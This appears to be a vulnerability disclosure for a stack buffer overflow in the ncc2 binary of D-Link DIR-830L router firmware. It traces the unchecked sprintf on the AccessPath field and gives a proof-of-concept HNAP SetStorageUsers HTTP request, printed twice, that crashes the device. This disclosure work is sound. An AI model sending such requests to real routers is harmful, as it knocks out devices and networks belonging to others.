# Summary
There is a buffer overflow vulnerability in `ncc2` binary file of D-Link DIR830LA1_FW100B07, which can lead to denial of service or potential command execution.

Fimware download link : 
https://legacyfiles.us.dlink.com/DIR-830L/REVA/FIRMWARE/DIR-830L_REVA_FIRMWARE_1.00B07.ZIP

Affected component is `pure_GetListDirectory` function and `SharePort_CreateUser.html`.

Notice: It also exists in **HotFixed** version!

# Details
Vulnerable code is in function `pure_GetListDirectory` of `sbin/ncc2` binary file:
![image](https://github.com/user-attachments/assets/6618278d-1537-4ef2-9c2f-6944bd878b2a)


Parameter `ListDirectoryPath` comes from XML form, and then use vulnerable funtion `sprintf` to concatenate string v34 to v35.

No length check for v34 leads to buffer overflow vulnerability.

However, it is a little bit difficult to find where `ListDirectoryPath` comes from. 

After a while, I find that corresponding web interface is `/SharePort_CreateUser.html`,
click  settings - shareport - create user:
![image](https://github.com/user-attachments/assets/7b747740-5551-4929-b99b-4ddb9b1a84e7)

The button `Browse` doesn't work, but we can use ctrl+shift+C to find the element:
![image](https://github.com/user-attachments/assets/12abce4e-ff70-4789-abad-9b721616249d)

![image](https://github.com/user-attachments/assets/767a9cad-f92e-4ecd-9f6d-f239fa73de4d)


Then use burpsuite to intercept the packet to find the format:
![image](https://github.com/user-attachments/assets/936766c0-9d75-4b41-bf3e-9ab7e49f2e05)

I infer that `AccessPath` is `ListDirectoryPath`.

We capture the packet and change the value of `<AccessPath>xxx</AccessPath>` to an overlong string, which can cause a stack overflow and lead to a denial of service.

**PoC**:
```html
POST /HNAP1/ HTTP/1.1

Host: 192.168.0.1

User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0

Accept: text/xml

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Content-Type: text/xml

SOAPACTION: "http://purenetworks.com/HNAP1/SetStorageUsers"

HNAP_AUTH: D1B21016C1C1F3792EFE725C756CAFB3 1730098755

Content-Length: 876

Origin: http://192.168.0.1

Connection: close

Referer: http://192.168.0.1/SharePort_CreateUser.html

Cookie: uid=pX66zWxIpD



<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<SetStorageUsers>
	<StorageUserInfoLists>
		<StorageUser>
			<UserName>guest</UserName>
			<Password>88170f76bd478c8d8234720e5899f4178c170f7656478cc68234210e5864f4178c170f7656478cc68234210e5864f4178c170f7656478cc68234210e5864f417</Password>
			<AccessPath></AccessPath>
			<Permission>false</Permission>
		</StorageUser>
	<StorageUser><UserName>nope</UserName><AccessPath>BufferOverflow...</AccessPath><Permission>false</Permission><Password>788d0f763d478c428234520e58aef4178c170f7656478cc68234210e5864f4178c170f7656478cc68234210e5864f4178c170f7656478cc68234210e5864f417</Password></StorageUser></StorageUserInfoLists>
</SetStorageUsers>
</soap:Body>
</soap:Envelope>
```
![DIR830-BufferOverflow](https://github.com/user-attachments/assets/47b48f16-3bb2-4fd3-a581-cf256ba71179)

# PoC
**Login** first, then visit `SharePort_CreateUser.html`, use burpsuite to intercept and edit the value of `AccessPath`:
```html
POST /HNAP1/ HTTP/1.1

Host: 192.168.0.1

User-Agent: Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/113.0

Accept: text/xml

Accept-Language: en-US,en;q=0.5

Accept-Encoding: gzip, deflate

Content-Type: text/xml

SOAPACTION: "http://purenetworks.com/HNAP1/SetStorageUsers"

HNAP_AUTH: D1B21016C1C1F3792EFE725C756CAFB3 1730098755

Content-Length: 876

Origin: http://192.168.0.1

Connection: close

Referer: http://192.168.0.1/SharePort_CreateUser.html

Cookie: uid=pX66zWxIpD



<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:xsi="http://www.w3.org/2001/XMLSchema-instance" xmlns:xsd="http://www.w3.org/2001/XMLSchema" xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/">
<soap:Body>
<SetStorageUsers>
	<StorageUserInfoLists>
		<StorageUser>
			<UserName>guest</UserName>
			<Password>88170f76bd478c8d8234720e5899f4178c170f7656478cc68234210e5864f4178c170f7656478cc68234210e5864f4178c170f7656478cc68234210e5864f417</Password>
			<AccessPath></AccessPath>
			<Permission>false</Permission>
		</StorageUser>
	<StorageUser><UserName>nope</UserName><AccessPath>BufferOverflow...</AccessPath><Permission>false</Permission><Password>788d0f763d478c428234520e58aef4178c170f7656478cc68234210e5864f4178c170f7656478cc68234210e5864f4178c170f7656478cc68234210e5864f417</Password></StorageUser></StorageUserInfoLists>
</SetStorageUsers>
</soap:Body>
</soap:Envelope>
```
![DIR830-BufferOverflow](https://github.com/user-attachments/assets/47b48f16-3bb2-4fd3-a581-cf256ba71179)
